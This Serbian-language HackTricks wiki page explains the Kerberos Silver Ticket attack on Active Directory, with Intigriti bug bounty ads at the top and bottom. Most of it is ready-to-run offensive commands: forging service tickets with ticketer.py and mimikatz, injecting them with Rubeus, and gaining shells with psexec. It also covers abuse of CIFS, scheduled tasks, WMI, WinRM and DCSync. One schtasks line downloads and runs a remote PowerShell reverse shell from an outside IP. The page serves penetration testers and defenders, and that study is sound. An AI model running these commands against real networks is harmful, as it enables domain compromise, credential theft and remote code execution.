# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

Napad **Silver Ticket** uključuje eksploataciju servisnih karata u Active Directory (AD) okruženjima. Ova metoda se oslanja na **dobijanje NTLM heša servisnog naloga**, kao što je nalog računara, kako bi se falsifikovala Ticket Granting Service (TGS) karta. Sa ovom falsifikovanom kartom, napadač može pristupiti specifičnim uslugama na mreži, **pretvarajući se da je bilo koji korisnik**, obično sa ciljem sticanja administratorskih privilegija. Naglašava se da je korišćenje AES ključeva za falsifikovanje karata sigurnije i manje uočljivo.

Za kreiranje karata koriste se različiti alati u zavisnosti od operativnog sistema:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Na Windows-u
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servis je istaknut kao uobičajena meta za pristupanje fajl sistemu žrtve, ali se i drugi servisi kao što su HOST i RPCSS takođe mogu iskoristiti za zadatke i WMI upite.

## Dostupne Usluge

| Tip Usluge                                 | Usluge Silver Tickets                                                      |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                   |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>U zavisnosti od OS takođe:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>U nekim slučajevima možete samo tražiti: WINRM</p> |
| Zakazani Zadaci                            | HOST                                                                      |
| Windows Deljenje Fajlova, takođe psexec   | CIFS                                                                      |
| LDAP operacije, uključujući DCSync        | LDAP                                                                      |
| Windows Alati za Udaljenu Administraciju  | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                        |
| Zlatni Tiketi                              | krbtgt                                                                    |

Korišćenjem **Rubeus** možete **tražiti sve** ove tikete koristeći parametar:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tiketi ID-evi Događaja

- 4624: Prijava na Nalog
- 4634: Odjava sa Naloga
- 4672: Prijava Administratora

## Zloupotreba Uslužnih tiketa

U sledećim primerima zamislimo da je tiket preuzet imitujući administratorski nalog.

### CIFS

Sa ovim tiketom bićete u mogućnosti da pristupite `C$` i `ADMIN$` folderima putem **SMB** (ako su izloženi) i kopirate fajlove u deo udaljenog fajl sistema jednostavno radeći nešto poput:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Moći ćete da dobijete shell unutar hosta ili izvršite proizvoljne komande koristeći **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Sa ovom dozvolom možete generisati zakazane zadatke na udaljenim računarima i izvršiti proizvoljne komande:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Sa ovim tiketima možete **izvršiti WMI u sistemu žrtve**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pronađite **više informacija o wmiexec** na sledećoj stranici:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Sa winrm pristupom preko računara možete **pristupiti** i čak dobiti PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Proverite sledeću stranicu da biste saznali **više načina za povezivanje sa udaljenim hostom koristeći winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Imajte na umu da **winrm mora biti aktivan i slušati** na udaljenom računaru da biste mu pristupili.

### LDAP

Sa ovom privilegijom možete dumpovati DC bazu koristeći **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saznajte više o DCSync** na sledećoj stranici:

## Reference

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Savjet za bug bounty**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
